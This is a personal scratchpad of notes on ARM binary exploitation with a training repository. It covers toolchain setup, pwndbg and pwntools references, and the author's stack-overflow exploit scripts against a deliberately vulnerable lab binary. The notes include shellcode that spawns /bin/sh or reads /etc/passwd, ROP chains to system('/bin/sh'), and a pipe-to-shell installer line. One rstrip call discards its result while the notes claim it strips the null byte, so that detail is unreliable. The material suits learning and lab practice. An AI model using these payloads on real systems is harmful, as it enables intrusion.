## scratchpad - random notes ###


### ARM binary exploitation: ###

https://github.com/bkerler/exploit_me


#### Setup ####

From exploit_me/scripts/setup.sh:
```
#!/bin/sh
sudo apt-get update
sudo apt-get install -y git libssl-dev libffi-dev build-essential libncurses5-dev 
sudo apt-get install -y gcc-arm-linux-gnueabi g++-arm-linux-gnueabi
sudo apt-get install -y gcc-aarch64-linux-gnu g++-aarch64-linux-gnu
sudo apt-get install -y qemu qemu-user-binfmt binfmt-support
sudo systemctl restart systemd-binfmt
sudo apt-get install -y gdb-multiarch
sudo cp /usr/arm-linux-gnueabi/lib/ld-linux.so.3 /lib 
sudo cp /usr/arm-linux-gnueabi/lib/libgcc_s.so.1 /lib
sudo cp /usr/arm-linux-gnueabi/lib/libc.so.6 /lib
```

pwndbg install:
```
curl --proto '=https' --tlsv1.2 -LsSf 'https://install.pwndbg.re' | sh -s -- -t pwndbg-gdb
```
OR grab a release:
```
https://github.com/pwndbg/pwndbg/releases
```

pwntools:
```
python3 -m venv ./pwntools
cd pwntools
bin/python -m pip install --upgrade pip
bin/python -m pip install --upgrade pwntools
```

#### Analysis ####

```
file
strings
```

#### Debugging ####

From exploit_me/bin/arm for 32-bit:
```
#!/bin/sh
qemu-arm -g 1234 -L /usr/arm-linux-gnueabi $*
```

From exploit_me/bin/arm64 for 64-bit:
```
#!/bin/sh
qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu $*
```

Shell 1:
Execute the target binary - ready for remote debugging on port 1234:
```
./arm exploit
```

Shell 2:
```
pwndbg ./exploit
target remote localhost:1234
```




# pwndbg Quick Reference

Organized by task. Notes for AArch32/ARM targets called out where relevant.

---

## Context & state

| Command | Does |
|---|---|
| `context` / `ctx` | Redraw the full context (regs, code, stack, backtrace) |
| `context reg code stack` | Show only chosen panes |
| `ctx-unset` / `set context-sections` | Configure which panes show |
| `regs` | Registers (with symbol/deref annotations) |
| `regs rax rbx` | Specific registers |
| `aslr` | Show/toggle ASLR (`aslr on/off`) |

## Running & stepping

| Command | Does |
|---|---|
| `start` | Break at entry (`main` if symbols) and run |
| `entry` | Break at real ELF entry point |
| `ni` / `si` | Step over / into (instruction-level) |
| `n` / `s` | Step over / into (source-level) |
| `c` | Continue |
| `nextcall` / `nextret` | Run to next `call` / `ret` |
| `nextsyscall` | Run to next syscall |
| `stepover` / `stepuntilasm mov` | Step until an asm pattern |

## Breakpoints

| Command | Does |
|---|---|
| `b *0x401234` | Break at absolute address |
| `b *$rebase(0x1234)` | Break at PIE offset (auto-adds load base) |
| `breakrva 0x1234` | Break at RVA in main binary |
| `watch *0x...` / `rwatch` / `awatch` | Write / read / access watchpoint |

## Memory inspection

| Command | Does |
|---|---|
| `x/32gx $rsp` | Classic gdb examine (g=giant/8B, w=4B on ARM32) |
| `hexdump 0x... 128` | Hex+ASCII dump |
| `telescope $rsp 20` | Recursive pointer-chase dump — the workhorse |
| `stack 20` | `telescope` on the stack pointer |
| `dq/dd/dw/db addr n` | Dump as qword/dword/word/byte |
| `search -t bytes "\x90\x90"` | Search all mapped memory |
| `search -s "/bin/sh"` | String search |
| `p2p mapA mapB` | Find pointers from region A into B |

## Maps, layout, symbols

| Command | Does |
|---|---|
| `vmmap` | Memory map (perms, backing file) |
| `vmmap heap` / `vmmap libc` | Filter by name |
| `piebase` | PIE load base |
| `libc` / `xinfo 0x...` | Resolve an address (which map, offset, section) |
| `got` / `plt` | Dump GOT / PLT |
| `nearpc 0x...` | Disassemble around an address |

## Heap (glibc)

| Command | Does |
|---|---|
| `heap` | Chunk listing for current arena |
| `bins` | All bins (fast/tcache/small/large/unsorted) |
| `tcache` / `fastbins` | Specific bin views |
| `top_chunk` / `arena` / `arenas` | Wilderness / arena state |
| `malloc_chunk 0x...` | Decode a single chunk header |
| `find_fake_fast 0x...` | Fastbin-attack target scanner |
| `vis_heap_chunks` | Visual heap layout (great for UAF/overlap) |

## Exploit-dev helpers

| Command | Does |
|---|---|
| `cyclic 200` | De Bruijn pattern out |
| `cyclic -l 0x6161616c` (or `-l $pc`) | Offset lookup from crash value |
| `checksec` | Mitigations on the binary |
| `canary` | Locate/print the stack canary |
| `rop --grep "pop rdi"` | ROP gadget search (ropper/pwntools-backed) |
| `ropgadget` / `jmpcall` | Alt gadget finders |
| `dumpargs` | Decode args at current call per calling convention |
| `plist` / `probeleak` | Scan a region for leaked pointers |
| `errno` | Decode last errno |

---

## Workflow notes

- `telescope` / `stack` are what you'll live in — they auto-deref and label, which beats raw `x/`.
- `cyclic -l $pc` (or `$lr` on ARM, since a stack smash often lands the pattern in the saved LR rather than PC) is the fast offset find.
- On AArch32 targets: use `w` width in `x/` (4-byte words), and remember `telescope` chases 4-byte pointers automatically once gdb knows the arch.
- ARM frame-reading: locals are addressed as fixed positive displacements off SP after the prologue reserves the frame (`sub sp, sp, #N`), so `str rX, [sp, #off]` is a spill to the local slot at `off`.





# pwntools Quick Reference

Exploit-dev / CTF reference. Covers `context`, I/O, packing, cyclic, GDB integration, shellcraft, and a worked template. ARM notes called out where relevant.

---

## Setup

```python
from pwn import *
```

That single import pulls in everything below: `context`, `remote`/`process`, `p32`/`u32`, `cyclic`, `asm`, `shellcraft`, `gdb`, `args`, `flat`, etc.

---

## context — set this first, everything reads from it

`context` is global state that packing, `asm`, `shellcraft`, and GDB all consult. Set it once at the top and the rest of the script inherits it.

```python
context.arch      = 'arm'        # 'amd64','i386','arm','aarch64','mips','thumb', ...
context.bits      = 32           # usually inferred from arch; override if needed
context.endian    = 'little'     # 'little' | 'big'
context.os        = 'linux'
context.log_level = 'info'       # 'debug' | 'info' | 'warning' | 'error'
context.terminal  = ['tmux', 'splitw', '-h']   # how gdb.debug() spawns a window
```

Common shorthand — set several at once:

```python
context.update(arch='arm', bits=32, endian='little', os='linux')
# or the binary sets arch/bits/endian for you:
context.binary = ELF('./target')     # exe = context.binary
```

| Field | Purpose |
|---|---|
| `arch` | Drives `asm`, `shellcraft`, packing widths, GDB |
| `bits` | 32/64; usually implied by `arch` |
| `endian` | Byte order for `p*`/`u*` and asm |
| `os` | Syscall/shellcraft target |
| `log_level` | Verbosity; `'debug'` prints every byte in/out |
| `terminal` | Command used to open the GDB window (`tmux` split, or e.g. an x-terminal) |

**Terminal tip:** run the script inside a `tmux` session with `context.terminal = ['tmux','splitw','-h']` and `gdb.debug()` opens the debugger in a side pane. Without a working terminal set, GDB integration can't spawn a visible window.

---

## Logging & args (the DEBUG flag)

```python
# from the CLI, no code edits:
#   python exploit.py DEBUG            -> log_level = debug (byte trace)
#   python exploit.py LOG_LEVEL=warn   -> set explicitly
#   python exploit.py REMOTE           -> your own gate (see below)

if args.DEBUG:
    context.log_level = 'debug'

io = remote('host', 1337) if args.REMOTE else process('./target')
```

`args.NAME` is truthy when `NAME` is passed on the command line; `NAME=value` arrives as a string. `DEBUG` is special-cased to set debug logging automatically.

---

## Byte packing / formatting

```python
p32(0x41414141)          # -> b'\x41\x41\x41\x41'  (pack, uses context.endian)
p64(0xdeadbeef)          # 64-bit pack
u32(b'\x41\x41\x41\x41') # -> 0x41414141           (unpack)
u64(data)                # 64-bit unpack

p32(x, endian='big')     # override per-call
u32(data, sign=True)     # signed unpack

# leak handling: pad short leaks before unpacking
leak = io.recv(3)
addr = u32(leak.ljust(4, b'\x00'))
```

**flat / fit — build structured payloads without manual concatenation:**

```python
payload = flat(
    b'A' * 76,          # padding to saved PC
    p32(0x00010509),    # return address
    arg1, arg2,
)

# fit() places values at offsets, filling gaps with a cyclic pattern:
payload = fit({76: p32(ret_addr), 88: p32(arg)})
```

**ARM note:** null bytes in an address can't pass through argv/`strcpy`. If the address is the *last* thing in the buffer, `strcpy` writes the terminating null for you — send the address minus its trailing null. For a Thumb target set bit 0: `p32(addr | 1)`.

---

## cyclic — offset discovery

```python
cyclic(200)                  # De Bruijn pattern, 200 bytes
cyclic_find(0x6161616c)      # -> offset where that 4-byte value sits
cyclic_find(b'laaa')         # also accepts the raw bytes

# 64-bit: use 8-byte subsequences
cyclic(200, n=8)
cyclic_find(0x6161616161616166, n=8)
```

Workflow: send `cyclic(200)`, crash, take the value in the saved PC (or **LR on ARM**, where a stack smash often lands), `cyclic_find` it to get the padding length.

---

## I/O — send & receive

```python
io.send(data)            # raw bytes, NO newline
io.sendline(data)        # appends b'\n'  (watch this for corruption payloads)
io.sendafter(b'> ', data)      # recvuntil(delim) then send
io.sendlineafter(b'> ', data)  # the common prompt-driven pattern

io.recv(1024)            # up to n bytes
io.recvline()            # one line (through \n)
io.recvuntil(b'flag{')   # read until marker — deterministic sync
io.recvall(timeout=2)    # read to EOF/timeout — catches final flush on exit
io.clean()               # drain buffered data

io.interactive()         # hand off to you (drops to a shell / manual I/O)
```

**The teardown gotcha:** if output shows up under `interactive()` but not without it, the script is exiting before the target's final write is read. Replace `interactive()` with `recvall(timeout=2)` (or `recvuntil(marker)`) to read it explicitly. `recvall` waits for EOF, which is exactly when a libc-buffered program flushes on exit.

---

## GDB integration

```python
gdbscript = '''
break *0x00010500
break main
continue
'''

# launch under gdb (needs context.terminal working, e.g. inside tmux):
io = gdb.debug('./target', gdbscript=gdbscript)

# or attach to an already-running process:
io = process('./target')
gdb.attach(io, gdbscript=gdbscript)
pause()                          # hold the script so you can look before it sends

# point at a specific gdb (e.g. gdb-multiarch for ARM cross-debugging):
context.gdb_binary = 'gdb-multiarch'
```

| Piece | Purpose |
|---|---|
| `gdb.debug(exe, gdbscript=...)` | Start the target under GDB from the start |
| `gdb.attach(io, gdbscript=...)` | Attach to a live `process`/`remote` |
| `gdbscript` (`gdb_commands`) | Commands run at launch — breakpoints, layout, etc. |
| `context.gdb_binary` | Which GDB to invoke (`gdb-multiarch` for cross-arch/ARM) |
| `context.terminal` | How the GDB window is spawned |

**Cross-arch:** for ARM binaries run under QEMU-user, `gdb.debug` wires up the QEMU gdbstub; set `context.gdb_binary='gdb-multiarch'` so the host GDB understands ARM. Pair with pwndbg for the richer `telescope`/`stack` views.

---

## asm / disasm

```python
context.arch = 'arm'
sc = asm('mov r0, #1')           # assemble -> bytes
print(disasm(sc))                # bytes -> listing

asm('nop')                       # arch-aware
```

---

## shellcraft — generated shellcode

```python
context.arch = 'arm'             # generator is arch-specific

sc  = shellcraft.sh()            # /bin/sh (as asm text)
sc  = shellcraft.execve('/bin/sh', 0, 0)
sc  = shellcraft.cat('/etc/passwd')
raw = asm(shellcraft.sh())       # assemble to raw bytes for the payload

# amd64 example:
context.arch = 'amd64'
raw = asm(shellcraft.amd64.linux.sh())
```

Namespaced by arch/os: `shellcraft.arm.linux.sh()`, `shellcraft.amd64.linux.execve(...)`, etc. When `context.arch`/`os` are set, the short forms resolve to the right variant. Output is assembly text — wrap in `asm()` to get bytes.

---

## Syscalls

```python
# via shellcraft (readable, arch-aware):
sc = shellcraft.syscall('SYS_execve', '/bin/sh', 0, 0)
sc = shellcraft.syscall('SYS_read', 0, buf, 100)
raw = asm(sc)

# constants are available directly:
print(constants.SYS_execve)      # arch-correct syscall number
print(constants.O_RDONLY)
```

`shellcraft.syscall(...)` emits the register setup + syscall/`svc` instruction for the current `context`. On ARM that's the `svc #0` convention with args in r0–r6 and the number in r7.

---

## ELF / ROP

```python
exe  = ELF('./target')
libc = ELF('./libc.so.6')

exe.symbols['main']              # symbol address
exe.got['puts']                  # GOT entry
exe.plt['system']                # PLT stub
exe.address = 0x10000            # rebase (PIE); symbols shift with it
next(exe.search(b'/bin/sh'))     # find bytes

rop = ROP(exe)
rop.raw(0x41414141)
rop.call('system', [next(exe.search(b'/bin/sh\x00'))])
rop.puts(exe.got['puts'])        # convenience: call puts(got_puts) to leak
print(rop.dump())                # inspect the chain
payload = rop.chain()            # -> bytes
```

---

## Worked template — local ARM stack overflow

```python
#!/usr/bin/env python3
from pwn import *

# --- context: set once, everything below inherits it ---
context.update(arch='arm', bits=32, endian='little', os='linux')
context.terminal   = ['tmux', 'splitw', '-h']
context.gdb_binary = 'gdb-multiarch'      # ARM under qemu-user
if args.DEBUG:
    context.log_level = 'debug'           # run: python exploit.py DEBUG

exe = context.binary = ELF('./target')

gdbscript = '''
break *0x00010500
continue
'''

def start():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    if args.REMOTE:
        return remote('host', 1337)
    return process([exe.path])

io = start()

# --- offset discovery (run once, then hardcode) ---
# io.sendline(cyclic(200))
# io.wait(); core = io.corefile
# offset = cyclic_find(core.pc)          # or core.lr on ARM
# log.info('offset = %d', offset)

offset  = 76
ret_addr = 0x00010509                     # target gadget/function

# --- build payload ---
payload  = flat(
    b'A' * offset,
    p32(ret_addr),                        # trailing null handled by strcpy if last
)

# --- deliver ---
io.sendlineafter(b'> ', payload)

# --- read the result (do NOT rely on interactive() to flush) ---
print(io.recvall(timeout=2).decode(errors='replace'))

# io.interactive()   # use when you actually want a shell
```

Run modes:

```
python exploit.py            # local, quiet
python exploit.py DEBUG      # local, byte trace
python exploit.py GDB        # under gdb in a tmux split
python exploit.py REMOTE     # against the remote host
```

---

## Gotcha checklist

- **Output only appears under `interactive()`** → replace with `recvall(timeout=2)`; the script was exiting before the final flush was read.
- **`sendline` vs `send`** → the appended `\n` (`0x0a`) can corrupt a saved-PC value. Match exactly what reached the target.
- **"Inappropriate nulls in argv"** → argv/`execve` can't carry interior nulls; a *trailing* null is fine to drop (`strcpy` re-adds it if the address ends the buffer).
- **Thumb target** → set bit 0 on the address (`addr | 1`).
- **Offset from LR, not PC** → on ARM a stack smash frequently overwrites the saved LR; `cyclic_find(core.lr)`.
- **GDB window won't open** → run inside `tmux` and set `context.terminal`; for ARM set `context.gdb_binary='gdb-multiarch'`.







# personal pwntools template

```
#!/home/dvader/tools/pwntools/bin/python3

from pwn import *

context(arch='arm', bits=32, endian='little')
''' ### enter tmux before running ### '''
context.terminal = ["tmux", "splitw", "-h"]

#username = b'\x41'*12
#username = cyclic(32)
username = cyclic(cyclic_find(0x61616164))
#username += b'\x90' * 4
target_address = p32(0x112d4)
target_address.rstrip(b'\x00')
username += target_address

password = 'password'
binary_args = ['/home/dvader/exploit_me/bin/exploit', 'help', username, password]

gdb_commands = '''
set debuginfod enabled off
set exec-wrapper env -i
b *0x1160c
continue
'''

context.gdb_binary = "/usr/local/bin/pwndbg"
io = gdb.debug(binary_args, gdbscript=gdb_commands)

if args.INTERACTIVE:
    io.interactive()
else:
    print(io.recvall(timeout=1))


''' Learned (LX) '''

# L0 - 
# L1 - 
# L2 - 


''' Remembered (RX) '''

# R0 - 


''' To Do (TX) '''

# T0 - 

```


# exploit_me ARM binary - level 2:
```
#!/home/dvader/tools/pwntools/bin/python3

from pwn import *

context(arch='arm', bits=32, endian='little')
''' ### enter tmux before running ### '''
context.terminal = ["tmux", "splitw", "-h"]

#username = b'\x41'*12
username = cyclic(cyclic_find(0x61616164))
#username += b'\x90' * 4
target_address = p32(0x112d4)
target_address.rstrip(b'\x00')
print(target_address)
username += target_address

password = 'password'
binary_args = ['/home/dvader/exploit_me/bin/exploit', 'help', username, password]

gdb_commands = '''
set debuginfod enabled off
set exec-wrapper env -i
b *0x1160c
continue
'''

context.gdb_binary = "/usr/local/bin/pwndbg"
io = gdb.debug(binary_args, gdbscript=gdb_commands)

if args.INTERACTIVE:
    io.interactive()
else:
    print(io.recvall(timeout=1))

#binary = ELF('../exploit')


''' Learned (LX) '''
# can't add additional bytes in the buffer due to the null byte trick for the target address
# username += cyclic(33)
# L0 - learned that luckily since the target address is the last thing we're sending via our buffer,
# we can leverage the null byte trick/rstrip to strip the null byte from the original 000112d4 target address

# L1 - learned in ghidra there was a function to jump to that ghidra didn't disassemble correctly
# L2 - learned to use ghidra's "Create Function" to fixup the incorrect disassembly


''' Remembered (RX) '''
# R0 - remembered some of the other calls like recvall() to wait for exploit to run and finish


''' To Do (TX) '''


```






